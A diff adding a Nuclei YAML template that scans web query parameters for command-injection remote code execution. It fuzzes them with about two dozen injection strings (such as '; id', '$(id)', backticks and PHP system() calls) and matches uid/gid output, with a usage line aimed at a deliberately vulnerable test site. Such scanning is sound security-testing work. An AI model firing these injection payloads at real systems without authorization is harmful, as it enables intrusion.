@@ -1,0 +1,56 @@
+id: RCE
+
+# Usage: 
+# echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t rce.yaml | awk '{print $6}'
+
+info:
+  name: Remote Code Execution (RCE) Detection
+  author: 25
+  severity: high
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+        - '| id'
+        - '; id'
+        - '&& id'
+        - '|| id'
+        - '$(id)'
+        - '`id`'
+        - '; system("id")'
+        - '; system("/usr/bin/id")'
+        - ';id;'
+        - '|id|'
+        - '|/usr/bin/id|'
+        - '||/usr/bin/id|'
+        - '%0Aid%0A'
+        - '%0A/usr/bin/id%0A'
+        - 'a);id'
+        - 'a);/usr/bin/id'
+        - 'a|id'
+        - 'a|/usr/bin/id'
+        - 'a;id'
+        - 'a;/usr/bin/id'
+        - '<?php system("id");?>'
+        - '"%2B`id`%2B"'
+        - '".system(%27id%27); $dummy="'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
